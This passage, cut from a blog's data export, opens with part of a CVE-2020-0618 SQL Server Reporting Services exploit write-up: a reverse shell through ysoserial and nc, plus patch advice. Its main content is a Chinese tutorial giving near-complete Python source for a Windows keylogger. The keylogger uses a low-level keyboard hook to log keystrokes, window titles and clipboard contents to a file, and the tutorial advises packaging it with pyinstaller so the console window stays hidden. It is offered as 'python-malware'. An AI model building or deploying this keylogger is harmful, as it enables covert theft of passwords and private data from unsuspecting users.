id=\"漏洞概述\"><a href=\"#漏洞概述\" class=\"headerlink\" title=\"漏洞概述\"></a>漏洞概述</h3><p>获得低权限的攻击者向受影响版本的SQL Server的Reporting Services实例发送精心构造的请求，可利用此漏洞在报表服务器服务帐户的上下文中执行任意代码。</p>\n<h3 id=\"受影响版本\"><a href=\"#受影响版本\" class=\"headerlink\" title=\"受影响版本\"></a>受影响版本</h3><ul>\n<li>SQL Server 2012 for 32-bit Systems Service Pack 4 (QFE)</li>\n<li>SQL Server 2012 for x64-based Systems Service Pack 4 (QFE)</li>\n<li>SQL Server 2014 Service Pack 3 for 32-bit Systems (CU)</li>\n<li>SQL Server 2014 Service Pack 3 for 32-bit Systems (GDR)</li>\n<li>SQL Server 2014 Service Pack 3 for x64-based Systems (CU)</li>\n<li>SQL Server 2014 Service Pack 3 for x64-based Systems (GDR)</li>\n<li>SQL Server 2016 for x64-based Systems Service Pack 1</li>\n<li>SQL Server 2016 for x64-based Systems Service Pack 2 (CU)</li>\n<li>SQL Server 2016 for x64-based Systems Service Pack 2 (GDR)</li>\n</ul>\n<h3 id=\"漏洞成因\"><a href=\"#漏洞成因\" class=\"headerlink\" title=\"漏洞成因\"></a>漏洞成因</h3><p>在ReportingServicesWebServer.dll中发现了此问题.Microsoft.Reporting.WebForms.BrowserNavigationCorrector的OnLoad方法使用LosFormatter类反序列化不受信任的用户输入:</p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/cve/1_1.png\" alt=\"1_1\"></p>\n<p>该BrowserNavigationCorrector类是使用由Microsoft.ReportingServices.WebServer.ReportViewerPage类:</p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/cve/1_2.png\" alt=\"1_2\"></p>\n<p>所以可以通过在本地 SharePoint服务器中调用/ReportServer/pages/ReportViewer.aspx页面来触发此功能.</p>\n<h3 id=\"利用工具\"><a href=\"#利用工具\" class=\"headerlink\" title=\"利用工具\"></a>利用工具</h3><p><a href=\"https://github.com/euphrat1ca/CVE-2020-0618\" target=\"_blank\" rel=\"noopener\">https://github.com/euphrat1ca/CVE-2020-0618</a></p>\n<h3 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h3><ul>\n<li>靶机</li>\n<li>系统：windows server 2016 standard evaluation</li>\n<li>Sql版本：Microsoft SQL Server 2016 (RTM) - 13.0.1601.5 (X64)</li>\n<li>Ip：192.168.0.105</li>\n<li>攻击机</li>\n<li>系统：windows7</li>\n<li>Ip:192.168.0.103</li>\n</ul>\n<p>(1) 存在漏洞路径。</p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/cve/1_3.png\" alt=\"1_3\"></p>\n<p>(2) 使用ysoserial.exe生成payload，生成完的payload存于剪切板。</p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/cve/1_4.png\" alt=\"1_4\"></p>\n<p>(3)    攻击机nc监听，利用poc加载payload反弹shell。接收到的权限为server权限。</p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/cve/1_5.png\" alt=\"1_5\"></p>\n<h3 id=\"防护建议\"><a href=\"#防护建议\" class=\"headerlink\" title=\"防护建议\"></a>防护建议</h3><p>由于攻击者可通过对请求数据包编码绕过Web应用防火墙的防护，强烈建议用户安装补丁程序进行修复。禁止匿名访问，确保只有经过身份验证的用户才能访问相关应用；如果怀疑服务器已经受到威胁，除安装相应补丁外，请及时更改服务器的账户口令，防止被攻击者利用。<br>版本对应补丁参阅</p>\n<p><a href=\"https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2020-0618\" target=\"_blank\" rel=\"noopener\">https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2020-0618</a></p>\n<h3 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h3><p><a href=\"https://blog.csdn.net/qq_40989258/article/details/105344344\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/qq_40989258/article/details/105344344</a></p>\n"},{"title":"建立键盘记录器part2","description":"使用python编写键盘记录器.","_content":"\n>part1使用while True死循环来时时监听用户敲击使得cpu占用率较高，容易被察觉。而part2则使用当用户敲击时触发来解决，且part2使用了`SetWindowsHookExa`在基于事情方法的性能要优于part1使用的`GetAsncKeyState`。\n\n### 加载库，初始化变量\n\n加载 `user32.dll` 和`kernel32.dll`，设置日志记录并创建变量以保存文本，窗口标题和按下的键。\n\n```python\nfrom ctypes import *\nfrom ctypes.wintypes import DWORD, LPARAM, WPARAM, MSG\nimport logging\nimport os\n\nlogging.basicConfig(filename=(os.environ['localappdata'] +\"\\\\\" + 'applog.txt'), level=logging.DEBUG, format='%(message)s')\n\n#加载所需库\nuser32 = windll.user32\nkernel32 = windll.kernel32\n\n\ncurrent_window = None   # 窗口标题\ncurrent_clipboard = []  # 剪贴板内容\nlast_key = None         # 最后一个按键\nline = \"\"               # 点击的键盘字符行\n```\n\n我们要利用钩子函数`SetWindowsHookExa`，`UnhookWindowsHookEx`和`CallNextHookEx`还需要一个类用作数据结构，以保存来自KBDLLHOOKSTRUCT结构的键盘输入事件中的数据。\n我们先声明一些常量，以后调用WinAPI函数时使用。\n\n```python\nWH_KEYBOARD_LL = 13     # 键盘钩子用于SetWindowsExa\nWM_KEYDOWN = 0x0100\nHC_ACTION = 0\n```\n\n`SetWindowsHookExa`需要知道它必须设置什么类型的钩子，我们使用`WH_KEYBOARD_LL`( 用来对底层的键盘输入事件进行监视，[详情参见](https://docs.microsoft.com/zh-cn/windows/win32/winmsg/about-hooks?redirectedfrom=MSDN))因为它不需要在进程中注入DLL，较难捕获。`WM_KEYDOWN`告诉我们何时按下非系统键。`GC_ACTION`是传递给`KeyboardProc`回调函数的参数\n\n### 使用虚拟键检测按下的特殊键\n\n将虚拟键映射到它们各自的十六进制值，并创建`HOOKPROC`回调函数。[虚拟键值参考](http://nehe.gamedev.net/article/msdn_virtualkey_codes/15009/)\n\n```python\nVIRTUAL_KEYS = {'RETURN': 0x0D,\n                'CONTROL': 0x11,\n                'SHIFT': 0x10,\n                'MENU': 0x12,\n                'TAB': 0x09,\n                'BACKSPACE': 0x08,\n                'CLEAR': 0x0C,\n                'CAPSLOCK': 0x14,\n                'ESCAPE': 0x1B,\n                'HOME': 0x24,\n                'INS': 0x2D,\n                'DEL': 0x2E,\n                'END': 0x23,\n                'PRINTSCREEN': 0x2C,\n                'CANCEL': 0x03\n                }\n\nHOOKPROC = WINFUNCTYPE(HRESULT, c_int, WPARAM, LPARAM)\n```\n\n我们需要数据结构来保存有关键盘输入事件的信息。这里MSDN提供了结构，[参考](https://docs.microsoft.com/zh-cn/windows/win32/api/winuser/ns-winuser-kbdllhookstruct)\n\n```python\nclass KBDLLHOOKSTRUCT(Structure): _fields_=[\n    ('vkCode',DWORD),\n    ('scanCode',DWORD),\n    ('flags',DWORD),\n    ('time',DWORD),\n    ('dwExtraInfo',DWORD)]\n````\n\n### 安装钩子来监听键盘事件\n\n创建一个名为`hook`的类，该类通过安装钩子来监听键盘事件。\n\n```python\nclass hook:\n\n    #用于安装/卸载钩子\n\n    def __init__(self):\n        #调用user32.dll和kernel32.dll\n        self.user32 = user32\n        self.kernel32 = kernel32\n        self.is_hooked = None\n\n\n    def install_hook(self, ptr):\n        #安装钩子\n        self.is_hooked = self.user32.SetWindowsHookExA(\n            WH_KEYBOARD_LL,\n            ptr,\n            kernel32.GetModuleHandleW(None),\n            0\n        )\n\n        if not self.is_hooked:\n            return False\n        return True\n\n    def uninstall_hook(self):\n        #卸载钩子\n        if self.is_hooked is None:\n            return\n        self.user32.UnhookWindowsHookEx(self.is_hooked)\n        self.is_hooked = None\n```\n\n`is_hooked`变量用于保存挂钩过程的句柄`SetWindowsHookExA`。\n`install_hook`方法用于安装钩子调用`SetWindowsHookExA`\n`uninstall_hook`方法用于卸载钩子。测试键盘记录程序时使用\n\n### get_current_window()和get_clipboard()\n\n用到part1抓取窗口标题与剪贴板数据。\n\n```python\ndef get_current_window():    #抓取当前窗口标题\n    #必需的WinAPI函数\n    GetForegroundWindow = user32.GetForegroundWindow\n    GetWindowTextLength = user32.GetWindowTextLengthW\n    GetWindowText = user32.GetWindowTextW\n\n    hwnd = GetForegroundWindow()    #获取当前窗口句柄\n    length = GetWindowTextLength(hwnd)    #获取标题文本长度，将句柄乍为参数传递\n    buff = ctypes.create_unicode_buffer(length + 1)    #创建临时缓存buff用于存储标题文本\n\n    GetWindowText(hwnd, buff, length + 1)    #获取窗口标题并存储在buff中\n\n    return buff.value    #返回buff的值\n\ndef get_clipboard():\n\n    CF_TEXT = 1    #设置剪贴板格式\n\n    #GlobalLock/GlobalUnlock 参数与返回类型\n    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]\n    kernel32.GlobalLock.restype = ctypes.c_void_p\n    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]\n\n    #GetClipboardData的返回类型\n    user32.GetClipboardData.restype = ctypes.c_void_p\n    user32.OpenClipboard(0)\n\n    #所需剪贴板函数\n    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable\n    GetClipboardData = user32.GetClipboardData\n    CloseClipboard = user32.CloseClipboard\n\n    try:\n        if IsClipboardFormatAvailable(CF_TEXT):    #如果CF_TEXT可用\n            data = GetClipboardData(CF_TEXT)    #获取剪贴板数据的句柄\n            data_locked = kernel32.GlobalLock(data)    #获取指向数据所在的内存位置的指针\n            text = ctypes.c_char_p(data_locked)    #获取指向data_locked位置的char*(python中的字符串)指针\n            value = text.value    #存储有用的值\n            kernel32.GlobalUnlock(data_locked)    #递减锁计数\n            return value.decode('utf-8')    #返回剪贴板的值\n    finally:\n        CloseClipboard()    #关闭剪贴板\n```\n\n### 键盘事件发生调用的钩子程序\n\n声明全局变量，这样每次点击按键时被清空。\n\n```python\ndef hook_procedure(nCode, wParam, lParam):\n\n    global last_key\n    global current_clipboard\n    global line\n    global current_window\n```\n\n与part1同，我们需要知道用户键入时当前窗口，以便我们如果使用检索到的数据。每当按下特定键里，我们可以使用函数来卸载钩子(此处为`CONTROL`)\n\n```python\nif current_window != get_current_window():    #判断current_window内容不是当前打开的窗口\n    current_window = get_current_window()    #将窗口标题放在current_window中\n    logging.info('[WINDOW] ' + current_window)    #将当前窗口标题写入日志文件\n\n\n#如果你在测试时想卸载钩子，请删除下面注释\n\"\"\"\nif user32.GetKeyState(VIRTUAL_KEYS['CONTROL']) & 0x8000:\n    hook.uninstall_hook()\n    return 0\n\"\"\"\n```\n\n```python\nif nCode == HC_ACTION and wParam == WM_KEYDOWN:\n    kb = KBDLLHOOKSTRUCT.from_address(lParam)\n    user32.GetKeyState(VIRTUAL_KEYS['SHIFT'])\n    user32.GetKeyState(VIRTUAL_KEYS['MENU'])\n    state = (c_char * 256)()\n    user32.GetKeyboardState(byref(state))\n    buff = create_unicode_buffer(8)\n    n = user32.ToUnicode(kb.vkCode, kb.scanCode, state, buff, 8 - 1, 0)    #ToUnicode返回值：-1/一个死键,0/不进行任何转换,1/一个字符,>=2/两个或多个字符\n    key = wstring_at(buff)\n```\n\n这里的逻辑是，当按下一个键时，我们调用之前创建的类`from_address`来获取有关键盘事件的信息，并将其`kb`作为数据结构存储在变量中`KBDLLHOOKSTRUCT`。创建一个`state`大小为256的变量来保存所有256个虚拟键的状态。这里调用`GetKeyboardState()`函数来完成。然后我们声明一个`Buff`变量以创建Unicode字符缓冲区(具有wchar数据类型的值的数组)。我们使用`ToUnicode`函数将虚拟按键代码或键盘状态转换为Unicode字符，然后使用`wstring_at()`将字符存储为1个字符的Unicode字符串。\n\n`ToUnicode`返回值存储在n中。每当按下一个键里钩子过程会存储一个返回值，我们可以使用它来确定是否记录字符。只要n大于0，我们就记录按下的键。\n```python\n    if n > 0:\n        if kb.vkCode not in VIRTUAL_KEYS.values():    #如果键入非特殊键，则加入line变量\n            line += key\n\n        for key, value in VIRTUAL_KEYS.items():    #如果键入特殊键，则记录特殊键名\n            if kb.vkCode == value:\n                logging.info(key)\n\n        if kb.vkCode == VIRTUAL_KEYS['RETURN']:    #如果键入RETURN，则记录并清除line变量\n            logging.info(line)\n            line = \"\"\n\n        if current_clipboard != get_clipboard():    #如果剪贴板中有新数据，则记录该数据\n            current_clipboard = get_clipboard()\n            logging.info('[CLIPBOARD] ' + current_clipboard + '\\n')\n\nreturn user32.CallNextHookEx(hook.is_hooked, nCode, wParam, lParam)    #将钩子信息传递给下个钩子过程CallNextHookEx\n```\n\n### last\n\n创建`hook`类实例，创建指针`ptr`，安装钩子`install_hook(ptr)`，等待钩子截获系统信息。\n\n```python\nhook = hook()\nptr = HOOKPROC(hook_procedure)\nhook.install_hook(ptr)\nmsg = MSG()\nuser32.GetMessageA(byref(msg), 0, 0, 0)\n```\n\n用pyinstaller将文件打包成exe，可以用参数-w/--noconsole来隐藏dos窗口\n\n解决part1的cpu占用率高问题，但未解决右键复制获取剪粘板数据。\n\n![part2_1](https://yui77111.github.io/assets/images/article/python/2_1.png)\n\n![part2_2](https://yui77111.github.io/assets/images/article/python/2_2.png)\n\n\n源代码已上传致[gayhub](https://github.com/yui77111/python-malware/blob/master/keylogger/part2.py)","source":"_posts/2019-08-01-建立键盘记录器part2.md","raw":"---\ntitle: 建立键盘记录器part2\ndescription: 使用python编写键盘记录器.\ncategories:\n - python\ntags: \n - python\n - 渗透测试\n---\n\n>part1使用while True死循环来时时监听用户敲击使得cpu占用率较高，容易被察觉。而part2则使用当用户敲击时触发来解决，且part2使用了`SetWindowsHookExa`在基于事情方法的性能要优于part1使用的`GetAsncKeyState`。\n\n### 加载库，初始化变量\n\n加载 `user32.dll` 和`kernel32.dll`，设置日志记录并创建变量以保存文本，窗口标题和按下的键。\n\n```python\nfrom ctypes import *\nfrom ctypes.wintypes import DWORD, LPARAM, WPARAM, MSG\nimport logging\nimport os\n\nlogging.basicConfig(filename=(os.environ['localappdata'] +\"\\\\\" + 'applog.txt'), level=logging.DEBUG, format='%(message)s')\n\n#加载所需库\nuser32 = windll.user32\nkernel32 = windll.kernel32\n\n\ncurrent_window = None   # 窗口标题\ncurrent_clipboard = []  # 剪贴板内容\nlast_key = None         # 最后一个按键\nline = \"\"               # 点击的键盘字符行\n```\n\n我们要利用钩子函数`SetWindowsHookExa`，`UnhookWindowsHookEx`和`CallNextHookEx`还需要一个类用作数据结构，以保存来自KBDLLHOOKSTRUCT结构的键盘输入事件中的数据。\n我们先声明一些常量，以后调用WinAPI函数时使用。\n\n```python\nWH_KEYBOARD_LL = 13     # 键盘钩子用于SetWindowsExa\nWM_KEYDOWN = 0x0100\nHC_ACTION = 0\n```\n\n`SetWindowsHookExa`需要知道它必须设置什么类型的钩子，我们使用`WH_KEYBOARD_LL`( 用来对底层的键盘输入事件进行监视，[详情参见](https://docs.microsoft.com/zh-cn/windows/win32/winmsg/about-hooks?redirectedfrom=MSDN))因为它不需要在进程中注入DLL，较难捕获。`WM_KEYDOWN`告诉我们何时按下非系统键。`GC_ACTION`是传递给`KeyboardProc`回调函数的参数\n\n### 使用虚拟键检测按下的特殊键\n\n将虚拟键映射到它们各自的十六进制值，并创建`HOOKPROC`回调函数。[虚拟键值参考](http://nehe.gamedev.net/article/msdn_virtualkey_codes/15009/)\n\n```python\nVIRTUAL_KEYS = {'RETURN': 0x0D,\n                'CONTROL': 0x11,\n                'SHIFT': 0x10,\n                'MENU': 0x12,\n                'TAB': 0x09,\n                'BACKSPACE': 0x08,\n                'CLEAR': 0x0C,\n                'CAPSLOCK': 0x14,\n                'ESCAPE': 0x1B,\n                'HOME': 0x24,\n                'INS': 0x2D,\n                'DEL': 0x2E,\n                'END': 0x23,\n                'PRINTSCREEN': 0x2C,\n                'CANCEL': 0x03\n                }\n\nHOOKPROC = WINFUNCTYPE(HRESULT, c_int, WPARAM, LPARAM)\n```\n\n我们需要数据结构来保存有关键盘输入事件的信息。这里MSDN提供了结构，[参考](https://docs.microsoft.com/zh-cn/windows/win32/api/winuser/ns-winuser-kbdllhookstruct)\n\n```python\nclass KBDLLHOOKSTRUCT(Structure): _fields_=[\n    ('vkCode',DWORD),\n    ('scanCode',DWORD),\n    ('flags',DWORD),\n    ('time',DWORD),\n    ('dwExtraInfo',DWORD)]\n````\n\n### 安装钩子来监听键盘事件\n\n创建一个名为`hook`的类，该类通过安装钩子来监听键盘事件。\n\n```python\nclass hook:\n\n    #用于安装/卸载钩子\n\n    def __init__(self):\n        #调用user32.dll和kernel32.dll\n        self.user32 = user32\n        self.kernel32 = kernel32\n        self.is_hooked = None\n\n\n    def install_hook(self, ptr):\n        #安装钩子\n        self.is_hooked = self.user32.SetWindowsHookExA(\n            WH_KEYBOARD_LL,\n            ptr,\n            kernel32.GetModuleHandleW(None),\n            0\n        )\n\n        if not self.is_hooked:\n            return False\n        return True\n\n    def uninstall_hook(self):\n        #卸载钩子\n        if self.is_hooked is None:\n            return\n        self.user32.UnhookWindowsHookEx(self.is_hooked)\n        self.is_hooked = None\n```\n\n`is_hooked`变量用于保存挂钩过程的句柄`SetWindowsHookExA`。\n`install_hook`方法用于安装钩子调用`SetWindowsHookExA`\n`uninstall_hook`方法用于卸载钩子。测试键盘记录程序时使用\n\n### get_current_window()和get_clipboard()\n\n用到part1抓取窗口标题与剪贴板数据。\n\n```python\ndef get_current_window():    #抓取当前窗口标题\n    #必需的WinAPI函数\n    GetForegroundWindow = user32.GetForegroundWindow\n    GetWindowTextLength = user32.GetWindowTextLengthW\n    GetWindowText = user32.GetWindowTextW\n\n    hwnd = GetForegroundWindow()    #获取当前窗口句柄\n    length = GetWindowTextLength(hwnd)    #获取标题文本长度，将句柄乍为参数传递\n    buff = ctypes.create_unicode_buffer(length + 1)    #创建临时缓存buff用于存储标题文本\n\n    GetWindowText(hwnd, buff, length + 1)    #获取窗口标题并存储在buff中\n\n    return buff.value    #返回buff的值\n\ndef get_clipboard():\n\n    CF_TEXT = 1    #设置剪贴板格式\n\n    #GlobalLock/GlobalUnlock 参数与返回类型\n    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]\n    kernel32.GlobalLock.restype = ctypes.c_void_p\n    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]\n\n    #GetClipboardData的返回类型\n    user32.GetClipboardData.restype = ctypes.c_void_p\n    user32.OpenClipboard(0)\n\n    #所需剪贴板函数\n    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable\n    GetClipboardData = user32.GetClipboardData\n    CloseClipboard = user32.CloseClipboard\n\n    try:\n        if IsClipboardFormatAvailable(CF_TEXT):    #如果CF_TEXT可用\n            data = GetClipboardData(CF_TEXT)    #获取剪贴板数据的句柄\n            data_locked = kernel32.GlobalLock(data)    #获取指向数据所在的内存位置的指针\n            text = ctypes.c_char_p(data_locked)    #获取指向data_locked位置的char*(python中的字符串)指针\n            value = text.value    #存储有用的值\n            kernel32.GlobalUnlock(data_locked)    #递减锁计数\n            return value.decode('utf-8')    #返回剪贴板的值\n    finally:\n        CloseClipboard()    #关闭剪贴板\n```\n\n### 键盘事件发生调用的钩子程序\n\n声明全局变量，这样每次点击按键时被清空。\n\n```python\ndef hook_procedure(nCode, wParam, lParam):\n\n    global last_key\n    global current_clipboard\n    global line\n    global current_window\n```\n\n与part1同，我们需要知道用户键入时当前窗口，以便我们如果使用检索到的数据。每当按下特定键里，我们可以使用函数来卸载钩子(此处为`CONTROL`)\n\n```python\nif current_window != get_current_window():    #判断current_window内容不是当前打开的窗口\n    current_window = get_current_window()    #将窗口标题放在current_window中\n    logging.info('[WINDOW] ' + current_window)    #将当前窗口标题写入日志文件\n\n\n#如果你在测试时想卸载钩子，请删除下面注释\n\"\"\"\nif user32.GetKeyState(VIRTUAL_KEYS['CONTROL']) & 0x8000:\n    hook.uninstall_hook()\n    return 0\n\"\"\"\n```\n\n```python\nif nCode == HC_ACTION and wParam == WM_KEYDOWN:\n    kb = KBDLLHOOKSTRUCT.from_address(lParam)\n    user32.GetKeyState(VIRTUAL_KEYS['SHIFT'])\n    user32.GetKeyState(VIRTUAL_KEYS['MENU'])\n    state = (c_char * 256)()\n    user32.GetKeyboardState(byref(state))\n    buff = create_unicode_buffer(8)\n    n = user32.ToUnicode(kb.vkCode, kb.scanCode, state, buff, 8 - 1, 0)    #ToUnicode返回值：-1/一个死键,0/不进行任何转换,1/一个字符,>=2/两个或多个字符\n    key = wstring_at(buff)\n```\n\n这里的逻辑是，当按下一个键时，我们调用之前创建的类`from_address`来获取有关键盘事件的信息，并将其`kb`作为数据结构存储在变量中`KBDLLHOOKSTRUCT`。创建一个`state`大小为256的变量来保存所有256个虚拟键的状态。这里调用`GetKeyboardState()`函数来完成。然后我们声明一个`Buff`变量以创建Unicode字符缓冲区(具有wchar数据类型的值的数组)。我们使用`ToUnicode`函数将虚拟按键代码或键盘状态转换为Unicode字符，然后使用`wstring_at()`将字符存储为1个字符的Unicode字符串。\n\n`ToUnicode`返回值存储在n中。每当按下一个键里钩子过程会存储一个返回值，我们可以使用它来确定是否记录字符。只要n大于0，我们就记录按下的键。\n```python\n    if n > 0:\n        if kb.vkCode not in VIRTUAL_KEYS.values():    #如果键入非特殊键，则加入line变量\n            line += key\n\n        for key, value in VIRTUAL_KEYS.items():    #如果键入特殊键，则记录特殊键名\n            if kb.vkCode == value:\n                logging.info(key)\n\n        if kb.vkCode == VIRTUAL_KEYS['RETURN']:    #如果键入RETURN，则记录并清除line变量\n            logging.info(line)\n            line = \"\"\n\n        if current_clipboard != get_clipboard():    #如果剪贴板中有新数据，则记录该数据\n            current_clipboard = get_clipboard()\n            logging.info('[CLIPBOARD] ' + current_clipboard + '\\n')\n\nreturn user32.CallNextHookEx(hook.is_hooked, nCode, wParam, lParam)    #将钩子信息传递给下个钩子过程CallNextHookEx\n```\n\n### last\n\n创建`hook`类实例，创建指针`ptr`，安装钩子`install_hook(ptr)`，等待钩子截获系统信息。\n\n```python\nhook = hook()\nptr = HOOKPROC(hook_procedure)\nhook.install_hook(ptr)\nmsg = MSG()\nuser32.GetMessageA(byref(msg), 0, 0, 0)\n```\n\n用pyinstaller将文件打包成exe，可以用参数-w/--noconsole来隐藏dos窗口\n\n解决part1的cpu占用率高问题，但未解决右键复制获取剪粘板数据。\n\n![part2_1](https://yui77111.github.io/assets/images/article/python/2_1.png)\n\n![part2_2](https://yui77111.github.io/assets/images/article/python/2_2.png)\n\n\n源代码已上传致[gayhub](https://github.com/yui77111/python-malware/blob/master/keylogger/part2.py)","slug":"2019-08-01-建立键盘记录器part2","published":1,"date":"2021-04-21T07:29:10.956Z","updated":"2020-07-24T03:56:53.850Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cknr54xhd000b8ot9ezfzar97","content":"<blockquote>\n<p>part1使用while True死循环来时时监听用户敲击使得cpu占用率较高，容易被察觉。而part2则使用当用户敲击时触发来解决，且part2使用了<code>SetWindowsHookExa</code>在基于事情方法的性能要优于part1使用的<code>GetAsncKeyState</code>。</p>\n</blockquote>\n<h3 id=\"加载库，初始化变量\"><a href=\"#加载库，初始化变量\" class=\"headerlink\" title=\"加载库，初始化变量\"></a>加载库，初始化变量</h3><p>加载 <code>user32.dll</code> 和<code>kernel32.dll</code>，设置日志记录并创建变量以保存文本，窗口标题和按下的键。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> ctypes.wintypes <span class=\"keyword\">import</span> DWORD, LPARAM, WPARAM, MSG</span><br><span class=\"line\"><span class=\"keyword\">import</span> logging</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\">logging.basicConfig(filename=(os.environ[<span class=\"string\">'localappdata'</span>] +<span class=\"string\">\"\\\\\"</span> + <span class=\"string\">'applog.txt'</span>), level=logging.DEBUG, format=<span class=\"string\">'%(message)s'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#加载所需库</span></span><br><span class=\"line\">user32 = windll.user32</span><br><span class=\"line\">kernel32 = windll.kernel32</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">current_window = <span class=\"literal\">None</span>   <span class=\"comment\"># 窗口标题</span></span><br><span class=\"line\">current_clipboard = []  <span class=\"comment\"># 剪贴板内容</span></span><br><span class=\"line\">last_key = <span class=\"literal\">None</span>         <span class=\"comment\"># 最后一个按键</span></span><br><span class=\"line\">line = <span class=\"string\">\"\"</span>               <span class=\"comment\"># 点击的键盘字符行</span></span><br></pre></td></tr></table></figure>\n\n<p>我们要利用钩子函数<code>SetWindowsHookExa</code>，<code>UnhookWindowsHookEx</code>和<code>CallNextHookEx</code>还需要一个类用作数据结构，以保存来自KBDLLHOOKSTRUCT结构的键盘输入事件中的数据。<br>我们先声明一些常量，以后调用WinAPI函数时使用。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">WH_KEYBOARD_LL = <span class=\"number\">13</span>     <span class=\"comment\"># 键盘钩子用于SetWindowsExa</span></span><br><span class=\"line\">WM_KEYDOWN = <span class=\"number\">0x0100</span></span><br><span class=\"line\">HC_ACTION = <span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n\n<p><code>SetWindowsHookExa</code>需要知道它必须设置什么类型的钩子，我们使用<code>WH_KEYBOARD_LL</code>( 用来对底层的键盘输入事件进行监视，<a href=\"https://docs.microsoft.com/zh-cn/windows/win32/winmsg/about-hooks?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\">详情参见</a>)因为它不需要在进程中注入DLL，较难捕获。<code>WM_KEYDOWN</code>告诉我们何时按下非系统键。<code>GC_ACTION</code>是传递给<code>KeyboardProc</code>回调函数的参数</p>\n<h3 id=\"使用虚拟键检测按下的特殊键\"><a href=\"#使用虚拟键检测按下的特殊键\" class=\"headerlink\" title=\"使用虚拟键检测按下的特殊键\"></a>使用虚拟键检测按下的特殊键</h3><p>将虚拟键映射到它们各自的十六进制值，并创建<code>HOOKPROC</code>回调函数。<a href=\"http://nehe.gamedev.net/article/msdn_virtualkey_codes/15009/\" target=\"_blank\" rel=\"noopener\">虚拟键值参考</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">VIRTUAL_KEYS = &#123;<span class=\"string\">'RETURN'</span>: <span class=\"number\">0x0D</span>,</span><br><span class=\"line\">                <span class=\"string\">'CONTROL'</span>: <span class=\"number\">0x11</span>,</span><br><span class=\"line\">                <span class=\"string\">'SHIFT'</span>: <span class=\"number\">0x10</span>,</span><br><span class=\"line\">                <span class=\"string\">'MENU'</span>: <span class=\"number\">0x12</span>,</span><br><span class=\"line\">                <span class=\"string\">'TAB'</span>: <span class=\"number\">0x09</span>,</span><br><span class=\"line\">                <span class=\"string\">'BACKSPACE'</span>: <span class=\"number\">0x08</span>,</span><br><span class=\"line\">                <span class=\"string\">'CLEAR'</span>: <span class=\"number\">0x0C</span>,</span><br><span class=\"line\">                <span class=\"string\">'CAPSLOCK'</span>: <span class=\"number\">0x14</span>,</span><br><span class=\"line\">                <span class=\"string\">'ESCAPE'</span>: <span class=\"number\">0x1B</span>,</span><br><span class=\"line\">                <span class=\"string\">'HOME'</span>: <span class=\"number\">0x24</span>,</span><br><span class=\"line\">                <span class=\"string\">'INS'</span>: <span class=\"number\">0x2D</span>,</span><br><span class=\"line\">                <span class=\"string\">'DEL'</span>: <span class=\"number\">0x2E</span>,</span><br><span class=\"line\">                <span class=\"string\">'END'</span>: <span class=\"number\">0x23</span>,</span><br><span class=\"line\">                <span class=\"string\">'PRINTSCREEN'</span>: <span class=\"number\">0x2C</span>,</span><br><span class=\"line\">                <span class=\"string\">'CANCEL'</span>: <span class=\"number\">0x03</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">HOOKPROC = WINFUNCTYPE(HRESULT, c_int, WPARAM, LPARAM)</span><br></pre></td></tr></table></figure>\n\n<p>我们需要数据结构来保存有关键盘输入事件的信息。这里MSDN提供了结构，<a href=\"https://docs.microsoft.com/zh-cn/windows/win32/api/winuser/ns-winuser-kbdllhookstruct\" target=\"_blank\" rel=\"noopener\">参考</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">KBDLLHOOKSTRUCT</span><span 